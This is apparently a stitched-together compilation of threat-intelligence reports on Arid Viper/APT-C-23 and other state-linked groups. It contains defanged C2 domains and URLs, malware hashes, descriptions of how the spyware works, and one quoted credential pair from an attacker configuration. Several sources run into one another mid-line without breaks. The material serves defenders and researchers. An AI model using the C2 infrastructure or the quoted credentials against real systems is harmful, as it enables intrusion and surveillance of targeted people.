jamila-c8420.appspot[.]com
showra-22501.firebaseio[.]com
showra-22501.appspot[.]com
goodwork-25869.firebaseio[.]com
goodwork-25869.appspot[.]com
advance-chat-app.firebaseio[.]com
advance-chat-app.appspot[.]com
filtersapp-715ee.firebaseio[.]com
filtersapp-715ee.appspot[.]com
humanrights-1398b.firebaseio[.]com
humanrights-1398b.appspot[.]com
jamilabouhaird-c0935.firebaseio[.]com
jamilabouhaird-c0935.appspot[.]com
hotchat-f0c0e.appspot[.]com
hotnewchat.appspot[.]com
Android Hashes
aeb0c38219e714ab881d0065b9fc1915ba84ad5b86916a82814d056f1dfaf66d
3c21c0f64ef7b606abb73b9574d0d66895e180e6d1cf2ad21addd5ade79b69fb
d2787aff6e827809b836e62b06cca68bec92b3e2144f132a0015ce397cf3cac2
2580f7afb4746b223b14aceab76bd8bc2e4366bfa55ebf203de2715176032525
f7ea82e4c329bf8e29e9da37fcaf35201dd79c2fc55cc0feb88aedf0b2d26ec2
0540051935145fb1e3f9361ec55b62a759ce6796c1f355249805d186046328dc
03de278ec4c4855b885520a377f8b1df462a1d8a4b57b492b3b052aafe509793
fe77e052dc1a8ebea389bc0d017191e0f41d8e47d034c30df95e3d0dc33cfe10
6356d55c79a82829c949a46c762f9bb4ca53da01a304b13b362a8a9cab20d4d2
9a53506c429fa4ff9113b2cbd37d96c708b4ebb8f3424c1b7f6b05ef678f2230
bf61c078157dd7523cb580672273190de5de3d41577f5d66c5afcdfeade09213
154cb010e8ac4c50a47f4b218c133b5c7d059f5aff4c2820486e0ae511966e89
44ccafb69e61139d9107a87f58133c43b8586931faf620c38c1824057d66d614
SpyNote C2
lion20810397.ddns[.]net
Windows Malware C2 Domains
camera.dvrcam[.]info
facebooks.ddns[.]me
google.loginto[.]me
Windows Malware Hashes
05320c7348c156f0a98907d2b1527ff080eae36437d58735f2822d9f42f5d273
Links to Android Malware
app-chat1.atwebpages[.]com
app-showchat.atwebpages[.]com
showra-chat.atwebpages[.]com
Arid Viper
This activity originated in Palestine and targeted individuals in the same region, including government officials, members of the Fatah political party, student groups and security forces. Our investigation linked this campaign to Arid Viper, a known advanced persistent threat actor. It used sprawling infrastructure to support its operations, including over a hundred websites that either hosted iOS and Android malware, attempted to steal credentials through phishing or acted as command and control servers.
They appear to operate across multiple internet services, using a combination of social engineering, phishing websites and continually evolving Windows and Android malware in targeted cyber espionage campaigns.
We shared threat indicators with industry peers and security researchers as part of a concerted effort to disrupt this group’s operations. We’re also sharing a detailed technical report with our findings, including threat indicators to help advance our industry’s understanding of this adversary (below).
Here are our key findings and some of the notable tactics, techniques and procedures (TTPs) we’ve observed:
Custom iOS Surveillanceware:
Arid Viper used custom-built iOS surveillanceware which hasn’t been previously reported and reflects a tactical shift. We call this iOS component Phenakite due to it being rare and deriving its name from the Greek word Phenakos, meaning to deceive or cheat.
Installation of Phenakite required that people be tricked into installing a mobile configuration profile. This allowed for a device-specific signed version of the iOS app to be installed on a device. A jailbroken device wasn’t required.
Post-installation, a jailbreak was necessary for the malware to elevate its privileges to retrieve sensitive user information not accessible via standard iOS permission requests. This was achieved with the publicly available Osiris jailbreak that made use of the Sock Port exploit, both of which were bundled in the malicious iOS app store packages (IPAs).
Arid Viper’s iOS surveillanceware was trojanized inside a fully functional chat application that used the open-source RealtimeChat code for legitimate app functionality. This malware could also direct people to phishing pages for Facebook and iCloud to steal their credentials for those services.
Arid Viper’s use of custom iOS surveillanceware shows that this capability is becoming increasingly attainable by adversaries believed to be of lower sophistication.
Evolving Android and Windows Malware
The Android tooling used by Arid Viper shares many similarities with malware previously reported as FrozenCell and VAMP .
The Android malware deployed by Arid Viper required people to install apps from third-party sources on their devices. The group used various convincing, attacker-controlled sites to create the impression that the apps were legitimate.
Arid Viper’s recent operations also used variants of a malware family known as Micropsia, which previously has been associated with this threat actor.
Malware Distribution
Delivery of both the Android and iOS malware involved social engineering.
Android malware was typically hosted on convincing looking attacker-controlled phishing sites. At the time of this writing, we discovered 41 such sites.
iOS malware was previously found to be distributed from a 3rd party Chinese app development site. After we shared our findings with industry partners which led to the revocation of multiple developer certificates, Arid Viper’s ability to distribute Phenakite was disrupted. We’ve since seen them try setting up their own infrastructure to distribute their iOS implant.
While Arid Viper tooling has previously been discovered in official app channels like the Play Store, we didn’t find it to be the case in this most recent campaign.Desert Falcons (Kaspersky)；双尾蝎 (360)；ATK 66 (Thales)；TAG-CT1；Two-tailed Scorpion(360)；
最早活跃时间
2011年
埃及；巴勒斯坦；以色列；约旦；土耳其；阿拉伯联合酋长国；沙特阿拉伯；美国；韩国；俄罗斯；黎巴嫩；伊拉克；加拿大；卡塔尔；德国；中国；叙利亚；也门；阿尔及利亚；印度；科威特；挪威；瑞典；法国；墨西哥；摩洛哥；阿尔巴尼亚；利比亚；罗马尼亚；意大利；匈牙利；澳大利亚；日本；津巴布韦；乌兹别克斯坦；乌克兰；中国台湾；苏丹；葡萄牙；毛里塔尼亚；马里共和国；伊朗；希腊；比利时；塞浦路斯；荷兰；巴基斯坦；丹麦；波斯尼亚和黑塞哥维那；
军队（与安全机构和陆军指挥单位有关的高级人员）；政府（负责国家卫生、打击洗钱、经济、贸易、部委、研究和开发的组织和人员；）；报纸；电视/广播电台；顶级媒体；金融及贸易机构（银行和投资公司）；研究及教育机构（伊斯兰大学；移民；阿拉伯裔的人权活动家；）；活动家和政治领袖；能源公司（电力、石油和天然气、建筑和智能电网）；物理安全公司；媒体记者；工业（为包括军事和航天在内的客户提供制造材料和设备的供应链承包商）；
Windows；Android；
VC（2016-2017）；Delphi（2017-2019）；Pascal（2019-2020）；
初始接入手段
钓鱼邮件；虚假网站；虚假社交网络账号；
Micropsia后门；信息窃取木马PyMICROPSIA；
APT-C-23是一个疑似来自加沙地区的APT组织，自2011年开始活跃，最早于2017年被披露，主要针对巴勒斯坦的教育机构和军事机构。安全厂商认为其是加沙网络团伙的一个分支，中等复杂度，组织成员大部分位于巴勒斯坦。
该组织的母语是阿拉伯语，据称，该组织是已知的第一个开发并开展全面网络间谍活动的阿拉伯语组织。第一例感染发生在2013年。该组织在2014年末/ 2015年初变得非常活跃。该组织的行动主要集中在政治和军事情报方面。 利用政治活动和新闻来诱使受害者打开文件和附件。
2011年，针对巴勒斯坦和以色列的攻击活动，持续了大约一年；
2015年2月，利用钓鱼邮件攻击了以色列的政府办公室、运输服务/基础设施供应商、军事组织和学术机构、科威特的一个学术机构，还有其他几个身份不明的以色列人；
2015年9月，针对主要位于以色列的电信、高科技、商业服务；
2016年5月起至2019年5月，双尾蝎组织（APT-C-23）对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击。攻击平台主要包括Windows与Android；
2017年，攻击以色列国防军；
2017年4月起，针对巴勒斯坦，特别是执法机构的钓鱼活动，传播MICROPSIA恶意软件，目的是远程控制被感染的系统；
2018年，利用Android恶意软件攻击以色列士兵；
2021年3月，利用选举话题攻击巴勒斯坦；
PC端： （来自白泽安全实验室-网络敌情综合跟踪系统）
该组织使用的技术一共涉及10个战术环节：
初始接入方式有附件钓鱼、链接钓鱼和服务钓鱼，使用鱼叉式网络钓鱼电子邮件，试图欺骗受害者打开恶意附件。
在执行阶段，主要采用的是诱导用户执行的方式，也会通过脚本化、API和命令行执行。
主要通过添加注册表启动项/启动文件夹来建立持久化。
通过绕过用户账户控制来进行权限提升，执行任意命令。
在防御规避环节，利用伪装、文件或信息混淆、文件删除、软件加壳、虚拟化/沙箱规避来规避检测。
在凭据访问环节，会窃取存储在注册表和浏览器（Firefox和Chrome）中的凭据。
在发现环节，会查找文件和目录、进程、系统信息、安全软件、系统所有者/用户、系统网络配置、软件等信息。
收集截图、本地系统的数据、键盘输入、录音、可移动载体的数据等数据并渗漏。
移动端： （来自白泽安全实验室-网络敌情综合跟踪系统）
该组织十分依赖社会工程学技术，利用社交网络诱惑受害者共享凭据信息并下载恶意app。或者通过虚假的Android应用商店、伪装成合法软件来分发恶意软件。之后收集大量设备信息和数据并渗漏到C2服务器。
卡巴斯基认为，该组织由大约30名成员组成，分为三个小组，主要在巴勒斯坦、埃及和土耳其开展活动。
通过使用的语言归因： 母语是阿拉伯语； 大多数恶意软件文件的PE资源“版本信息”与“Lang属性”设置为“阿拉伯语”；C&C管理员的用户名是阿拉伯语；在C&C域名的注册历史中发现阿拉伯名字和电子邮件；可靠的阿拉伯语网络钓鱼邮件和文件；DHS间谍软件的命令和控制界面使用的是阿拉伯语；
KASPERAGENT： K ASPERAGENT是一款自2015年7月开始针对美国、以色列、巴勒斯坦地区、埃及的Windows恶意软件。 使用Microsoft Visual C ++开发，是基本侦察工具和其他有效载荷的下载器。 伪装成不存在的产品，添加启动项，值为MediaSystem，建立持久性。 通过HTTP请求与C2服务器通信。 其他功能： 窃取Firefox和Chrome浏览器的密码； 截屏； 记录用户击键； 提取基本环境信息，例如用户名和计算机名称； 执行任意命令； 枚举可移动驱动器并将感兴趣的文件复制到新文件夹以进行渗漏； 更新恶意软件； 提取任意文件（压缩和加密的zip文件）；
FrozenCell： 多平台的移动端监视软件，主要功能： 录音、检索通用电话元数据、定位设备、提取SMS消息、检索受害者账户、渗漏图片、下载并安装其他App、查找并渗漏pdf, doc, docx, ppt, pptx, xls, and xlsx格式的文件、检索联系人列表。
GnatSpy： VAMP的变种，移动端恶意软件，比VAMP更综合性、模块化。
ViperRAT： 经常被用来攻击和监视以色列国防军； 第一种变种是“第一阶段应用”，它对设备进行基本分析，并在特定条件下尝试下载并安装更全面的监视软件组件，也就是第二种变种。
Micropsia： 是一个用Delphi编写的信息窃取恶意软件家族，具有多种内置的数据窃取功能。 该恶意软件通常以RAR的形式提供，RAR一旦提取就包含一个EXE，再使用UPX打包。 从UPX解压缩后，下一个级别是另一个SFX RAR文件，该文件中包含实际的恶意软件文件。 主要功能： 将击键记录到硬编码的文本文件中，并渗漏到远程服务器； 捕获屏幕截图； 搜索扩展名与Microsoft Office文档匹配的文件，并在渗漏前使用WinRAR进行压缩。
VAMP： 功能： 通话录音、窃取联系人、窃取设备上存储的文件、窃取信息。
SECUREUPDATE： 下载器，下载并执行其他有效载荷。 某些SECUREUPDATE后门版本试图窃取用户的凭据，从而使他们除了安装恶意软件外还为这些虚假应用程序创建帐户。
Arid Viper： 后门，功能： 键盘记录、窃取浏览器数据
DHS间谍软件： 该组织从2014年6月起开始使用的一种全新的、完全重写的后门程序，主要功能： 屏幕截图和键盘记录、录音、下载和上传 文件、窃取密码、交互式shell。 从2015年起，该恶意软件增加了新的功能和技术以逃避检测，也增加了加密的C&C通信和文件存储。 新的恶意软件被命名为DHS2015或iRAT。
XtremeRat： 商用后门木马。Disclaimer: The views, methods, and opinions expressed at Anchored Narratives are those of the author and do not necessarily reflect the official policy or position of my employer. Cover: Indian power companies are targeted by the ReverseRat threat actor Introduction June ended as the month of # PrintNightmare , and the critical vulnerability impacts many organizations. Many of the (nation-state) threat actors will likely abuse this flaw if they were not already abusing it. Like last month, an overview of this month’s observed cyber operations was shared by security researchers via Twitter. Where applicable, I will briefly describe the geopolitical tension between states. In this month’s overview, IOC’s from nation-state threat actors were selected that presumably originate from actors from Vietnam, China, India, and Pakistan, by basically searching for the keywords “ apt “ and “ c2: ” or “ c2 ” over the collected Twitter data from June 2021. The reported IOC’s have not been examined yet and are therefore weakly anchored with evidence. But let’s see what has been shared by security researchers for June 2021. Middle East Figure 1:Middle East Gaza In June, the following campaign was shared via Twitter by the alleged Palestinian threat actor dubbed APT-C-23 or Desert Viper. "New #APT #APT-C-23 #micropsia sample md5：8c560cf2281320736e03f126d978ba28
filename:Experience or leadership skills experience or leadership skills.exe
C2:howard-maria[.]me
Drops generic CV template as decoy (cb142b1fe66cd3720b7d2cb054d50f82)" Some other malware samples were also shared on Twitter: "#APT-C-23 #AirdViper #CTI #APT e38c06f83a5c1b0a4f82c965a4c78654
15398d1f1280c5b40deae7f91cc06b36
5ea012cc4aca5eb4ff4211ae32dabb9d
8bd5dd1fe94bf55a3fcf16d669a90686
https://t.co/fSzwFdHV9M" Some researchers on Twitter refer that the above samples might indicate that EgyptAir might be a target of the actor. "New sample seems used by #APT-C-23. Once it gets executed, a document relating to infomation about #EgyptAir is shown to confuse the victim and meanwhile #RAT is executed to perform remote control.
https://t.co/vm1moMOxIW
https://t.co/7NrAFW5duH 823bf27b1e559d6607f5224ab99de1c83bb5d36e2ed0e6644d551e94ec45d248 "#APT-C-23 #AirdViper #CTI #APT
335e604a7c3866b3fad6e8ee6989ddb9
The position of the president and the leadership on the elections and the corresponding proposals for the decrees https://t.co/KQ6yiTslm2" Iran I will not go into disputes with other countries because there are many tensions between Iran's neighbors or the United States. Iran as a country is protected by mountains that are natural borders and is one of the highly populated and educated countries in the region. Therefore also a force to reckon with. There a multiple alleged nation-state actor groups that originate from Iran. For an overview of actors, visit the threat actor card maintained by the Thai Cert. This month the following activity was observed of APT34 or Oilrig. One of the actor groups which is held responsible for the Shamoon attacks in 2012. "#APT
Sample from #APT34 Group:1858b880e23f1df3735f00719c2c28a3
We also spot an attack where DNS tunneling was used, suspected belong to #APT34, here are the captured samples:
a90ae3747764127decae5a0d7856ef95
e2919dea773eb0796e46e126dbce17b1" "#APT34
#oilrig
63ff31ede9713c10ba6b6f965167cbbd
ab25014c3d6f77ec5880c8f9728be968
e7737a2e170459905216622f2d43e4da
host:\"https://t.co/G6RQLX1vlH[.]lb\"
username:\"sig.dir.logistic\"
password:\"P@ssw0rdSigL0g\"
to:\"masters.michelle@protonmail.com\"" Asia Figure 2: Dam tensions in Laos, Thailand, and Vietnam Vietnam China is building multiple dams on the Mekong river. This also impacts the water flow downstream and impacts the irrigation of Myanmar, Thailand, Cambodia, and Vietnam. Since the building of the damns by China, geopolitical tensions are growing. Water is the new oil, and whoever controls it gains power. This, among other disputes , brings tensions in the South China Sea. Multiple threat actors are tracked from this region. One of them originates from Vietnam and is dubbed OceanLotus or APT32 . The following samples of APT32 were collected during June via Twitter. "Today our researchers have found #RotaJakiro #ELF implant which maybe copy from #Oceanlotus #APT group
ITW:1242ae39377b855f10fee9d61188dba9" "Today our researchers have found #RotaJakiro #ELF implant which maybe copy from #Oceanlotus #APT group
ITW:b3771f1b343c575392b261cc9bbe5675
34596914beb5d8a615662a4b21e5c1f7" "#APT #APT32 #OceanLotus Sample
MD5:3aac297222bd691edb2b9c3ccb5b7e4c" "#APT#OceanLotus
MD5:92da5c6a3212a1b806d0729a07d0f1db
CobaltStrike payload
C2:sjbingdu[.]info
IP:185[.]225[.]19[.]100" China Mustang Panda China has a tremendous amount of nation-state actor groups. One of them has been dubbed by Crowdstrike as Mustang Panda and targets aviation, Government , NGOs , Think Tanks worldwide. "#MustangPanda #APT
1854b3dcd60b46e6039972824faea889435a19c3
Bing Malleable
C2 176.118.167.36
Usual campaign with DLL side load (C:\\Users\\Public\\Libraries\\Touch\\AcroRd32.dll)" "#MustangPanda #PlugX variant
Encrypted: https://t.co/UmLYbRPe2l
Decryption Key: 6f 41 68 53 4f 70 69 6b 56 Config:185.239.226[.]17:965
185.239.226[.]17:110
103.200.97[.]189:965
103.200.97[.]189:110 https://t.co/sERztfYgVk" APT41 Although no direct indicators were shared on Twitter, AirIndia was compromised by an actor called APT41, according to threat intelligence company Group-IB . According to FireEye, APT41 is a prolific cyber threat group that carries out Chinese state-sponsored espionage activity in addition to financially motivated activity potentially outside of state control. The group targets the following sectors worldwide: Construction, Defense, Education, Energy, Financial, Government, Healthcare, High-Tech, Hospitality, Manufacturing, Media, Oil and Gas, Petrochemical, Pharmaceutical , Retail, Telecommunications, Transportation, Online video game companies. The analysis of Group-IB was called the “ Big Airline Heist .” Their report contains many indicators of compromise. Their tweet is shared below. "New Group-IB #ThreatIntelligence blog is live!
Group-IB team attributed #AirIndia incident with moderate confidence to Chinese nation-state TA #APT41.
The campaign was codenamed #ColunmTK ⬇️
https://t.co/V3zgDuTsHS
https://t.co/ssAjD9ec24" Pakistan Figure 3: Pakistan and its neighbors (graphic courtesy Publicintelligence ) Also, in June, the alleged nation-state actor that belongs to Pakistan Transparent Tribe or APT36 has been very active. For example, in June 2021, the following campaigns were shared on Twitter. "Today our researchers have found sample which belongs to #TranSparentTribe #APT group
ITW:4a7ff92e0ea13b41a5e3410c3becfb2e
filename:i.docm
C2:198.23.210.211:4898(8786)
https://t.co/WPoFbbR7MO" "#TransparentTribe #APT:
Maldoc:Defence and security Agenda Point.ppt 54d5743efcc5511368c6c04bf6840a59
#Crimson Rat:6d88dcb578cef59d3d0244d1e93b0f57
trbgertrnion.exe
C2:167.160.166.80
Debug path:e:\\core-projects\\adii\\trbgertrnion\\trbgertrnion\\obj\\Debug\\trbgertrnion.pdb
https://t.co/3Qc08jhvyN" "This might be #TransparentTribe #APT maldoc:5cbcc3485f4286098b3a111ceec8ce54 Dropped payload:c08e1509f379755df710d5a8fd4ff175
C2:5.189.170.84
Some other samples associated to this APT are using this C2:b03e0568a5f26addc51c8a3e32baeb7f 9dadf9ce41994f869e8c35e1917b8238
https://t.co/tfw1uUrdfh" Lastly, a new Pakistani APT, dubbed ReverseRat, was reported by Lumen in June, targeting medical and energy corporations in India. Indicators are listed below. Ashish Kunwar @D0rkerDevil Pakistani APTs targeting medical and energy corps in India .双尾蝎（奇安信内部跟踪编号：APT-Q-63）是一个长期针对中东地区的高级威胁组织，其最早于2017年被披露。至少自2016年5月起，持续针对巴勒斯坦教育机构、军事机构等重要领域进行网络间谍活动，以窃取敏感信息为主的网络攻击组织，开展了有组织，有计划，有针对性的攻击。 近日，奇安信威胁情报中心红雨滴团队在日常的威胁狩猎中捕获了该组织多起攻击样本，捕获的样本包括伪装成政治热点、教育相关的可执行文件诱饵，以及伪装成微软图像处理设备控制面板程序(ImagingDevices.exe)，此类样本运行后，将会释放展示正常的诱饵以迷惑受害者，同时后门将继续在后台运行以窃取受害者计算机敏感信息。 奇安信威胁情报中心在发现此次攻击活动的第一时间便向安全社区进行了预警 [1] 。
02 详细分析
样本1 与我们在去年《 近期双尾蝎APT组织利用伪造社交软件等针对多平台的攻击活动分析 》 [2] 一文中披露的windows平台样本相似，均为Delphi 语言编写，且携带一个隐藏的窗体，均从资源中释放诱饵文档。
与去年我们披露的样本一样，样本1中的Timer1会引导其他控件执行任务，Time1执行后首先会从资源中获取诱饵文档数据保存到%tmp%目录下，然后将其打开以迷惑受害者。
以往样本中的REG_LNK_TimerTimer功能函数被修改为样本1中的ShortClick函数，由Timer3进行调用，在%tmp%目录创建一个指向自身的lnk文件，随后移植到启动目录用于持久化。
以往样本中的Button2Click函数被修改为样本1中的NewClick函数，由Timer4进行调用，收集计算机名字，用户名，系统版本等信息与8位随机字符拼接后用base64加密。
样本2 从自身资源中释放诱饵文档到C:\ProgramData\AuditPolicyGPInterop\ MangeFile，然后将其移植到样本所在位置，命名为Folder并调用ShellExecuteA打开。
在C:\ProgramData\AuditPolicyGPInterop目录创建副本AuditPolicy.exe，以及释放文件AuditPolicyGP.ne。
并循环判断驱动器的类型，将收集的计算机名称与MAC地址，经base64加密后，通过固定格式“celal=加密的计算机名称与MAC地址&type=驱动器类型&value=驱动器路径“上传至C2: peterabernathy[.]online
在本次攻击活动中，双尾蝎组织尝试使用新的方式驻留在受害主机中，通过获取驱动器根目录下指定后缀文件，将其加入自身资源区段中，进而释放新的副本在驱动器根目录下。
奇安信威胁情报中心对此次捕获样本攻击手法，代码逻辑层面分析，发现此次捕获的攻击样本与双尾蝎APT组织常用攻击手法，恶意代码基本一致。其中Delphi 语言编写的样本较以往样本无较大变化，而VC版本则增加了新的持久化方式，以及丰富了指令内容。 经关联分析，我们从样本库中关联出一些与VC版本后门代码几乎一致的样本，释放的诱饵以及C2均为同一个。
以及发现一例与以往捕获Delphi版本后门样本相似的样本，释放与教育相关的诱饵文档。
أسستربويةمقترحةلتنميةرأسالمالالفكريلدىالمعلمينبناءعلىمتطلباتالتنميةالمستدامة .pdf(根据可持续发展的要求发展教师知识资本的教育基础)
4406525982688345c1919d46f4338fa6
Win32 EXE
dorothymambrose[.]live
样本成功执行后展示的诱饵文档如下：
双尾蝎组织是常年活跃在中东地区APT团伙，其具有Windows和Android双平台攻击武器，且仅Windows平台恶意代码就丰富多变，具有多种语言编译的后门。 此次捕获的样本主要针对中东地区开展攻击活动，暂未发现影响国内用户，但防范之心不可无，奇安信红雨滴团队提醒广大用户，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行夸张的标题的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。 若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行简单判别。目前已支持包括Windows、安卓平台在内的多种格式文件深度分析。 目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。
5711989af8510851baf4fec63d67d1e3 4fadb4accea641e71553c381f2f9ca21 4406525982688345c1919d46f4338fa6 705d6c0a0d6a102de66f23193054f9bb 3ed3e34b08c85f8685a3a5e103e48bf3 487c2e7a01767c3a0935d8ab28f2dbb7 82ca6a4c3055488d7cc38e0bc9c70285 61563f6547c6aa0f2cee08b59b05063e 0bfaee63d7b3e24a7672f78e5059146c 73f65ac692029f3b995ce3a014309a6a URL hxxp://peterabernathy.online/Alyanak/mehro hxxp://peterabernathy.online/Alyanak/check hxxp://peterabernathy.online/Alyanak/Sema hxxp://peterabernathy.online/Alyanak/Coskun/QU5BTFlTVDAtMkQxNjcxLTA4LTAwLTI3LTdBLTBELUQz hxxps://dorothymambrose.live/hx3FByTR5o3zNZYD/sYkaiHz0Mse13C79dy1I/Bbf0VKK5GZjWAo2phPwe hxxps://kristinthomas.work/hx3FByTR5o3zNZYD/sYkaiHz0Mse13C79dy1I
[1] https://twitter.com/RedDrip7/status/1425695844183859201
[2] https://mp.weixin.qq.com/s/yobOH_jdKx69m4_i1qDrLADuring our routine threat hunting exercise, Cyble Research Labs came across a Twitter post mentioning a new variant of Android malware used by APT-C-23.
This Advanced Persistent Threat (APT) group was first identified in 2017, where they targeted more than 100 devices from Palestine.
This variant calls itself Google_Play_Installer7080009821206716096 to trick users into thinking it’s an APK related to Google Play.
Cyble Research Labs downloaded the sample and identified that APT-C-23, also known as “the two-tailed scorpion,” targets the Middle East with this version of Android malware. This malware can steal sensitive information like Contact data, SMS data, and files from the infected device.
The delivery mechanisms used by the Threat Actors (TAs) are through phishing or via a fake Android app store; this application has an icon that is similar to the Telegram app.
Once the malware is successfully executed on the affected Android device, it can perform several malicious activities without the user’s knowledge. These activities include taking pictures, recording audio, disabling WiFi, stealing call logs, stealing SMSs, stealing Contact data, and steal files of a wide range of extensions (PDF, doc, docx, ppt, pptx, xls, xlsx, txt, text, jpg, jpeg, png), etc.
The malware can also make calls without the user’s knowledge, delete files from the device, record the victim device’s screen, take screenshots, read the text content, and record incoming and outgoing calls in WhatsApp. Additionally, the malware checks for telecom operating out of the Middle East and specifically targets them.
In 2020, APT-C-23 was also responsible for the attack on Israeli Defense Forces (IDF).
Technical Analysis
APK Metadata Information
App Name: Google Play Installer
Package Name: org.telegram.light
SHA256 Hash: c8d51db4b2171f289de67e412193d78ade58ec7a7de7aa90680c34349faeeee2
Figure 1 shows the metadata information of the application.
Figure 1 Metadata Information
We have outlined the flow of the application and the various activities conducted by it. Refer to Figure 2.
The application has a similar icon as Telegram official app.
The application asks for Contacts, call logs, and SMS permissions.
The application asks users to grant admin rights.
The application asks the users to allow access to notifications.
The application asks permission to install 3 rd party applications.
The application shows the Telegram app UI.
Figure 2 Application Start Flow
Upon simulating the application, we observed that it requests users for permissions to access Contacts, Call logs, and SMS data. Refer to Figure 3.
Figure 3 Requests Sensitive Permissions
Figure 4 shows the malware asking users for device admin activation. Once the malware gains admin rights, then it can enhance its features.
Figure 4 Requests for Admin Activation
Figure 5 shows that the malware asks the users to enable notification access for the application. Once the application gains notification access, it can read all notifications on the device, including SMS data.
Figure 5 Asks for Notification Access
Upon receiving notification access, the application prompts users asking for permission to install 3 rd party applications. Once it gains this permission, the application will be able to install other applications or update itself. Refer to Figure 6.
Figure 6 Asks for 3rd Party App Installation Permission
Figure 7 shows that after getting the required permissions, the malware opens a UI that is similar to the official Telegram app.
Figure 7 Similar UI as Telegram App
Manifest Description
Voicemail requests thirty-five different permissions, of which the attackers can abuse eighteen. In this case, the malware can:
Read, delete or modify SMSs, call logs, and Contact data.
Make calls without user interaction
Delete SMS data
Kill background processes of other apps
Receive and send SMSs
Reads current cellular network information, phone number and the serial number of the affected phone, the status of any ongoing calls, and a list of any phone accounts (for example: firmware accounts such as Samsung account) registered on the device.
Read, delete or modify the files on the device’s external storage
Disable the keylock and any associated password security measures such as biometric verification.
We have listed the dangerous permissions below.
Permissions Description
READ_SMS Access phone messages.
READ_CONTACTS Access phone contacts.
KILL_BACKGROUND_PROCESSES Allows applications to kill the background processes of other apps.
CALL_PHONE Allows an application to initiate a phone call without going through the Dialer user interface to confirm the call.
RECEIVE_SMS Allows an application to receive SMS messages.
SEND_SMS Allows an application to send SMS messages.
READ_CALL_LOG Access phone call logs.
READ_PHONE_STATE Allows access to phone state, including the current cellular network information, the phone number and the serial number of this phone, the status of any ongoing calls, and a list of any Phone Accounts registered on the device.
REORDER_TASKS Allows the app to push tasks to the foreground and background.
WRITE_CONTACTS Allows the app to modify the device’s contacts data.
WRITE_EXTERNAL_STORAGE Allows the app to write or delete files to the external storage of the device.
READ_EXTERNAL_STORAGE Allows the app to read the contents of the device’s external storage.
RECORD_AUDIO Allows the app to record audio with the microphone, which can be misused by the attackers.
PROCESS_OUTGOING_CALLS Allows the app to process outgoing calls and modify the dialling number.
WRITE_CALL_LOG Allows the app to modify the device’s call log.
DISABLE_KEYGUARD Allows the app to disable the keylock and any associated password security.
READ_PROFILE Allows the app to read personal profile information such as name and contact information stored on the device.
SYSTEM_ALERT_WINDOW Allows the app to draw on top of other applications.
Table 1 Permissions’ Description
The below image shows that the malware has defined services that can be used to read notification data on the device. Refer to Figure 8.
Figure 8 Service to Read Notifications
The below image shows that the malware has defined services that can be used for Accessibility services. Refer to Figure 9.
Figure 9 Service Defined for Accessibility
The below image shows that the malware has a defined receiver that can be used to gain system-level device administration access. Refer to Figure 10.
Figure 10 Receiver Defined to Gain Admin Rights
Source Code Description
The below images show that the malware checks for various telecom companies operating in the Middle East. Refer to Figure 11.
Figure 11 Checks for Sim Operator Company
The code given in Figure 12 shows that the malware is capable of reading Contact data.
Figure 12 Reads Contacts Data
The code shown in Figure 13 demonstrates that the malware is capable of reading SMS data.
Figure 13 Reads SMS Data
The code shown in Figure 14 demonstrates that the malware is capable of reading CallLogs data from the device.
Figure 14 Reads Call Logs
The code shown in Figure 15 demonstrates that the malware is capable of calling any number without the user’s knowledge or interaction.
Figure 15 Can Make Calls
The below code shows that the malware is capable of capturing pictures without user interaction. Refer to Figure 16.
Figure 16 Capture Pictures
The code shown in Figure 17 demonstrates that the malware can steal specific files from the device based on the various extensions shown in the below table.
File Type Description
.pdf Portable Document Format
.doc DOCument
.docx DOCument
.ppt PowerPoint presentation
.pptx PowerPoint presentation
.xls Microsoft Excel spreadsheet file
.xlsx Microsoft Excel spreadsheet file
.txt TeXT
.text TeXT
Table 2 File Type Description
Figure 17 Steals Specific Files
The below code demonstrates that the malware is capable of reading WhatsApp text data and recording incoming and outgoing WhatsApp calls. Refer to Figure 18.
Figure 18 Reads and Records WhatsApp Data
The below code demonstrates that the malware is capable of recording audio from the device. Refer to Figure 19.
Figure 19 Records Audio
The below code demonstrates that the malware is capable of disabling WiFi connections. Refer to Figure 20.
Figure 20 Disabled Wi-Fi
The below code demonstrates the URL’s connectivity to post the data to the server. Refer to Figure 21.
Figure 21 URL Connection
Conclusion
APT-C-23 TA groups use Android spyware to specifically target users in the Middle East.
These TAs are constantly adapting their methods to avoid detection and find new ways to target users through sophisticated techniques. One of the most common methods used to infect devices is by disguising the malware as a supposedly legitimate Google application to confuse users into installing them.
Users should only install applications after verifying their authenticity and install them exclusively from the official Google Play Store to avoid such attacks.
Our Recommendations
We have listed some essential cybersecurity best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below:
Download and install software only from official app stores like the Google Play Store.
Ensure that Google Play Protect is enabled on Android devices.
Users should be careful while enabling any permissions on their devices.
If you find any suspicious applications on your device, uninstall, or delete them immediately.
Use the shared IOCs to monitor and block the malware infection.
Keep your anti-virus software updated to detect and remove malicious software.
Keep your Android device, OS, and applications updated to the latest versions.
Use strong passwords and enable two-factor authentication.
MITRE ATT&CK® Techniques
Tactic Technique ID Technique Name
Initial Access T1444
T1476 Masquerade as Legitimate Application
Deliver Malicious App via Other Means
Execution T1575 Native Code
Persistence T1402 Broadcast Receivers
Defense Evasion T1508 Supress Application Icon
Collection T1412
T1432
T1433
T1517
T1429
T1512
T1533
T1513 Capture SMS Messages
Access Contacts List
Access Call Log
Access Notifications
Capture Audio
Capture Camera
Data from Local System
Screen Capture
Impact T1447 Delete Device Data
Indicators of Compromise (IOCs)
Indicators Indicator type Description
c8d51db4b2171f289de67e412193d78ade58ec7a7de7aa90680c34349faeeee2 SHA256 Malicious APK
hxxps://linda-gaytan[.]website URL Communicating URL
hxxps://cecilia-gilbert[.]com URL C2 Domain
hxxps://david-gardiner[.]website URL Communicating URL
hxxps://javan-demsky[.]website URL C2 Domain
About Us
